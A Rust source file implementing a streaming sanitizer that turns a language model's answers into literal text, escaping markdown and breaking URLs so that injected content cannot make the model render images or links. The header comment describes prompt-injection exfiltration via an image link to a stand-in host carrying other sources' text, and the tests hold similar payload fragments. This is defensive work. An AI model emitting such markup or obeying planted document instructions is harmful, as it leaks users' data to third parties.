//! The answer as it leaves roll: model output is untrusted, and a planted document can make the
//! model write markup that a chat UI loads or links (`![.](https://evil.example/p?d=<other
//! sources>)`, a reference definition, an autolink, a URL a renderer links), sending text the
//! reader may read to someone else. So every answer, streamed or whole, native or OpenAI's, goes
//! through [`Sanitizer`], which makes the model's text literal instead of looking for the markup
//! renderers might find in it (four rounds of review showed renderers reinterpret text in more
//! ways than patterns can follow: table cells, strikethrough, entities decoded before linking):
//!
//! - **Markdown's characters as entities.** Every `&`, `\`, `` ` ``, `~`, `|`, `<`, `>`, `[`,
//!   `]`, `!`, `*`, `_` and `#` the model writes becomes its numeric entity (`&#60;`), which every
//!   renderer shows as the character and none reads as syntax: no tag, image, link, definition,
//!   table, code span, emphasis or heading can start, and an entity or escape the model wrote
//!   (`&#47;`, `\/`) shows as written, never decoded into what it spells.
//! - **Link-shaped tokens broken.** U+2060 WORD JOINER goes inside every `//`, after a `:` that
//!   follows a letter (`https:`, `mailto:`), between `www` and its `.`, and before every `@`: no
//!   GFM, marked, markdown-it or remark autolink spans it, and it's invisible.
//! - `\r` and `\r\n` become `\n`.
//!
//! Nothing is held back, so an answer streams character by character and every split of it
//! comes out the same; only with `allow_links` does an open `[` wait (at most [`MAX_HOLD`]
//! bytes) to see whether it's a link to keep. A kept link is an inline `[label](url)` (never an
//! image) whose URL is exactly one in the given sources' fields and made only of [`keepable`]
//! characters, emitted as is (a client comparing URLs finds the source's); its label is literal
//! like any text. Any other URL, a source's own written out bare included, shows broken.
//!
//! What's left to the renderer (docs/search/rag.md): a kept link carries no `rel` or
//! `referrerpolicy`; a renderer that links bare domains (markdown-it's fuzzy linkify) can still
//! link `example.com`; one that decodes entities twice turns the entities back into markup; and
//! the model's markdown (emphasis, headings, tables, code) shows as its characters.

use std::fmt::Write as _;

/// The most bytes an open `[` holds (`allow_links` only).
pub const MAX_HOLD: usize = 2048;

const WORD_JOINER: char = '\u{2060}';

/// What becomes a numeric entity.
const LITERAL: [char; 13] = ['&', '\\', '`', '~', '|', '<', '>', '[', ']', '!', '*', '_', '#'];

/// Whether `url` may be a kept link: http(s), at most 2048 bytes, and only characters that can't
/// end a link destination, split a table cell or start markup (RFC 3986's unreserved and
/// reserved characters but `(`, `)`, `[`, `]`, `'` and `|`, and `%`).
pub fn keepable(url: &str) -> bool {
    let rest = url.strip_prefix("https://").or_else(|| url.strip_prefix("http://"));
    rest.is_some_and(|r| !r.is_empty() && url.len() <= 2048 && r.bytes().all(|b| b.is_ascii_alphanumeric() || b"-._~:/?#@!$&*+,;=%".contains(&b)))
}

/// Makes an answer's text literal as it streams.
pub struct Sanitizer {
    /// URLs a link may keep (`allow_links`: the sources' own, [`keepable`] ones); `None`: none.
    allowed: Option<Vec<String>>,
    /// The last text fed ended with `\r`: a `\n` starting the next is the same line ending.
    after_cr: bool,
    /// The model's last three characters, newest last.
    prev: [char; 3],
    /// An open `[` and what followed it (`allow_links` only).
    held: String,
}

/// What an open `[…` is so far.
enum Open {
    More,
    No,
    /// A whole `[label](url)`: the byte ranges of its label and URL in what's held.
    Link { label: std::ops::Range<usize>, url: std::ops::Range<usize> },
}

fn open_link(h: &str) -> Open {
    let Some(label_end) = h[1..].find([']', '[', '\n']).map(|i| i + 1) else {
        return if h.len() - 1 > 512 { Open::No } else { Open::More };
    };
    if h.as_bytes()[label_end] != b']' || label_end - 1 > 512 {
        return Open::No;
    }
    let after = label_end + 1;
    match h.as_bytes().get(after) {
        None => return Open::More,
        Some(b'(') => {}
        Some(_) => return Open::No,
    }
    let start = after + 1;
    match h[start..].find(|c: char| c == ')' || c == '(' || c.is_whitespace()) {
        None if h.len() - start > 2048 => Open::No,
        None => Open::More,
        Some(i) if h.as_bytes()[start + i] == b')' => Open::Link { label: 1..label_end, url: start..start + i },
        Some(_) => Open::No,
    }
}

impl Sanitizer {
    pub fn new(allowed: Option<Vec<String>>) -> Sanitizer {
        let allowed = allowed.map(|a| a.into_iter().filter(|u| keepable(u)).collect());
        Sanitizer { allowed, after_cr: false, prev: ['\0'; 3], held: String::new() }
    }

    /// `text` with `\r\n` and `\r` as `\n` (a `\r\n` split across two pieces too).
    fn lines(&mut self, text: &str) -> String {
        let mut out = String::with_capacity(text.len());
        let mut chars = text.chars().peekable();
        if self.after_cr && chars.peek() == Some(&'\n') {
            chars.next();
        }
        while let Some(c) = chars.next() {
            if c == '\r' {
                out.push('\n');
                if chars.peek() == Some(&'\n') {
                    chars.next();
                }
            } else {
                out.push(c);
            }
        }
        if !text.is_empty() {
            self.after_cr = text.ends_with('\r');
        }
        out
    }

    /// One character the model wrote, as literal text.
    fn literal(&mut self, c: char, out: &mut String) {
        let [p3, p2, p1] = self.prev;
        if LITERAL.contains(&c) {
            let _ = write!(out, "&#{};", c as u32);
        } else if c == '/' && p1 == '/' {
            out.push(WORD_JOINER);
            out.push('/');
        } else if c == '.' && p3.eq_ignore_ascii_case(&'w') && p2.eq_ignore_ascii_case(&'w') && p1.eq_ignore_ascii_case(&'w') {
            out.push(WORD_JOINER);
            out.push('.');
        } else if c == ':' && p1.is_ascii_alphabetic() {
            out.push(':');
            out.push(WORD_JOINER);
        } else if c == '@' {
            out.push(WORD_JOINER);
            out.push('@');
        } else {
            out.push(c);
        }
        self.prev = [p2, p1, c];
    }

    fn step(&mut self, c: char, out: &mut String) {
        if !self.held.is_empty() {
            self.held.push(c);
            self.settle(false, out);
        } else if c == '[' && self.allowed.is_some() {
            self.held.push(c);
        } else {
            self.literal(c, out);
        }
    }

    /// Decides what's held once it can be (`end`: nothing more comes).
    fn settle(&mut self, end: bool, out: &mut String) {
        let held = std::mem::take(&mut self.held);
        match open_link(&held) {
            Open::More if !end && held.len() <= MAX_HOLD => self.held = held,
            // Not after `!`: an image is never kept.
            Open::Link { label, url } if self.prev[2] != '!' && self.allowed.as_ref().is_some_and(|a| a.iter().any(|u| *u == held[url.clone()])) => {
                out.push('[');
                for c in held[label].chars() {
                    self.literal(c, out);
                }
                out.push_str("](");
                out.push_str(&held[url]);
                out.push(')');
                self.prev = [self.prev[1], self.prev[2], ')'];
            }
            // Not a link to keep: the `[` as text, and what followed it again.
            _ => {
                self.literal('[', out);
                for c in held[1..].chars() {
                    self.step(c, out);
                }
                if end && !self.held.is_empty() {
                    self.settle(true, out);
                }
            }
        }
    }

    /// Takes `text` and answers it, literal.
    pub fn feed(&mut self, text: &str) -> String {
        let text = self.lines(text);
        let mut out = String::with_capacity(text.len() + text.len() / 4);
        for c in text.chars() {
            self.step(c, &mut out);
        }
        out
    }

    /// Releases what's held (the answer ended: nothing can complete it).
    pub fn finish(&mut self) -> String {
        let mut out = String::new();
        if !self.held.is_empty() {
            self.settle(true, &mut out);
        }
        out
    }
}

/// An answer's text, whole, sanitized.
pub fn sanitize(text: &str, allowed: Option<Vec<String>>) -> String {
    let mut s = Sanitizer::new(allowed);
    let mut out = s.feed(text);
    out.push_str(&s.finish());
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use comrak::nodes::NodeValue;

    /// `out` rendered as GitHub-flavored markdown (extended autolinks, footnotes, tables,
    /// strikethrough) holds no image, no HTML, no link but to `allowed`, and no text a renderer
    /// could link (a URL, an address, `www.`, a protocol-relative `//host`).
    fn inert(out: &str, allowed: &[String]) {
        let mut o = comrak::Options::default();
        o.extension.autolink = true;
        o.extension.footnotes = true;
        o.extension.table = true;
        o.extension.strikethrough = true;
        o.extension.tasklist = true;
        let arena = comrak::Arena::new();
        let root = comrak::parse_document(&arena, out, &o);
        // (`mailto:` and `xmpp:` aren't links without their address, and `@` is broken.)
        let linkable = regex::Regex::new(r"(?i)https?://|ftp://|www\.|//[a-z0-9-]|[a-z0-9.+_-]@[a-z0-9]").unwrap();
        for n in root.descendants() {
            match &n.data().value {
                NodeValue::Link(l) => assert!(allowed.contains(&l.url), "a link to {} in {out:?}", l.url),
                NodeValue::Image(l) => panic!("an image of {} in {out:?}", l.url),
                NodeValue::HtmlInline(h) => panic!("inline HTML {h:?} in {out:?}"),
                NodeValue::HtmlBlock(h) => panic!("an HTML block {:?} in {out:?}", h.literal),
                NodeValue::FootnoteReference(_) | NodeValue::FootnoteDefinition(_) => panic!("a footnote in {out:?}"),
                NodeValue::Table(_) => panic!("a table in {out:?}"),
                NodeValue::Text(t) if n.parent().is_none_or(|p| !matches!(p.data().value, NodeValue::Link(_))) => assert!(!linkable.is_match(t), "linkable text {t:?} in {out:?}"),
                _ => {}
            }
        }
    }

    /// Every payload of the reviews (`tests/fixtures/chat-markup.json`): `force` ones behind an
    /// open `[` past the bound, `allowed` ones with links allowed to those URLs.
    fn corpus() -> Vec<(String, String, Option<Vec<String>>)> {
        let v: serde_json::Value = serde_json::from_str(include_str!("../../../tests/fixtures/chat-markup.json")).unwrap();
        v.as_array()
            .unwrap()
            .iter()
            .map(|it| {
                let mut text = it["text"].as_str().unwrap().to_string();
                if it["force"] == true {
                    text = format!("[{}{text}", "w ".repeat(MAX_HOLD / 2 + 4));
                }
                let allowed = it.get("allowed").and_then(|a| a.as_array()).map(|a| a.iter().map(|u| u.as_str().unwrap().to_string()).collect());
                (it["name"].as_str().unwrap().to_string(), text, allowed)
            })
            .collect()
    }

    fn run(chunks: &[&str], allowed: &Option<Vec<String>>) -> String {
        let mut s = Sanitizer::new(allowed.clone());
        let mut out: String = chunks.iter().map(|c| s.feed(c)).collect();
        out.push_str(&s.finish());
        out
    }

    fn kept(allowed: &Option<Vec<String>>) -> Vec<String> {
        allowed.iter().flatten().filter(|u| keepable(u)).cloned().collect()
    }

    #[test]
    fn every_reviewed_payload_is_literal_however_the_stream_splits_it() {
        for (name, text, allowed) in corpus() {
            let whole = sanitize(&text, allowed.clone());
            inert(&whole, &kept(&allowed));
            let chars: Vec<String> = text.chars().map(String::from).collect();
            assert_eq!(run(&chars.iter().map(String::as_str).collect::<Vec<_>>(), &allowed), whole, "[{name}] one character at a time");
            for (at, _) in text.char_indices().skip(1) {
                assert_eq!(run(&[&text[..at], &text[at..]], &allowed), whole, "[{name}] split at {at}");
            }
        }
    }

    #[test]
    fn literal_text_and_kept_links() {
        assert_eq!(sanitize("![x](https://e/p) <img> a|b ~c~ *d* `e` #f &amp; \\[", None), "&#33;&#91;x&#93;(https:\u{2060}/\u{2060}/e/p) &#60;img&#62; a&#124;b &#126;c&#126; &#42;d&#42; &#96;e&#96; &#35;f &#38;amp; &#92;&#91;");
        assert_eq!(sanitize("www.e.com help@e.com mailto:x ftp://e 10:30", None), "www\u{2060}.e.com help\u{2060}@e.com mailto:\u{2060}x ftp:\u{2060}/\u{2060}/e 10:30");
        let ok = Some(vec!["https://help.acme.test/pw".to_string(), "https://help.acme.test/(x)".to_string()]);
        assert_eq!(
            sanitize("[Reset *now*](https://help.acme.test/pw) ![i](https://help.acme.test/pw) [y](https://evil.example) [z](https://help.acme.test/(x)) https://help.acme.test/pw", ok),
            "[Reset &#42;now&#42;](https://help.acme.test/pw) &#33;&#91;i&#93;(https:\u{2060}/\u{2060}/help.acme.test/pw) &#91;y&#93;(https:\u{2060}/\u{2060}/evil.example) &#91;z&#93;(https:\u{2060}/\u{2060}/help.acme.test/(x)) https:\u{2060}/\u{2060}/help.acme.test/pw"
        );
        assert!(!keepable("https://evil.example/|<style>") && !keepable("javascript:alert(1)") && keepable("https://help.acme.test/a?b=1&c=%20#d"));
        // An open `[` is bounded.
        let mut s = Sanitizer::new(Some(vec!["https://a.test/".into()]));
        let out = s.feed(&format!("[{}", "w ".repeat(MAX_HOLD)));
        assert!(out.starts_with("&#91;w w"), "{}", &out[..20]);
        assert_eq!(s.finish(), "");
    }

    /// The reviewer's random compositions of dangerous fragments (round 4), each whole and in
    /// random pieces: the same answer, and inert.
    #[test]
    fn random_compositions_are_literal() {
        const P: &[&str] = &[
            "[", "]", "(", ")", "!", "<", ">", "`", "*", "_", ":", "/", "//", "https:", "http://", "https://", "www.", "evil.example", "x", "ab", "@", "mailto:", " ", "\n", "img src=x", "a", "1", ".", "\"", "中", "é", "-",
            "?d=S", "]:", "<a href=x>", "\t", "#", "=", ";", "{", "}", "^", "$", "%", "+", ",", "'", "\r", "&#47;", "&#58;", "|", "~", "\\", "&", "&amp;", "\u{2060}", "[ok](https://help.acme.test/pw)", "https://help.acme.test/pw", "| h |\n|---|\n| ",
        ];
        let mut seed: u64 = 1;
        let mut rnd = |n: usize| {
            seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
            ((seed >> 33) as usize) % n
        };
        for i in 0..4000 {
            let allowed = (i % 2 == 0).then(|| vec!["https://help.acme.test/pw".to_string()]);
            let k = 3 + rnd(14);
            let text: String = (0..k).map(|_| P[rnd(P.len())]).collect();
            let whole = sanitize(&text, allowed.clone());
            inert(&whole, &kept(&allowed));
            let chars: Vec<char> = text.chars().collect();
            let mut pieces = Vec::new();
            let mut at = 0;
            while at < chars.len() {
                let to = (at + 1 + rnd(4)).min(chars.len());
                pieces.push(chars[at..to].iter().collect::<String>());
                at = to;
            }
            assert_eq!(run(&pieces.iter().map(String::as_str).collect::<Vec<_>>(), &allowed), whole, "{text:?} in {pieces:?}");
        }
    }

    /// Sanitizes a file of inputs for the gate's renderer check (marked, markdown-it, remark):
    /// `ROLL_SANITIZE_IN` holds `[{chunks: [..], allowed?: [..]}]`, `ROLL_SANITIZE_OUT` gets the
    /// outputs in order. Not run by `cargo test`.
    #[test]
    #[ignore]
    fn sanitize_inputs_for_renderers() {
        let Ok(input) = std::env::var("ROLL_SANITIZE_IN") else { return };
        let items: Vec<serde_json::Value> = serde_json::from_str(&std::fs::read_to_string(input).unwrap()).unwrap();
        let outs: Vec<String> = items
            .iter()
            .map(|it| {
                let chunks: Vec<&str> = it["chunks"].as_array().unwrap().iter().map(|c| c.as_str().unwrap()).collect();
                let allowed = it.get("allowed").and_then(|a| a.as_array()).map(|a| a.iter().map(|u| u.as_str().unwrap().to_string()).collect());
                run(&chunks, &allowed)
            })
            .collect();
        std::fs::write(std::env::var("ROLL_SANITIZE_OUT").unwrap(), serde_json::to_string(&outs).unwrap()).unwrap();
    }
}
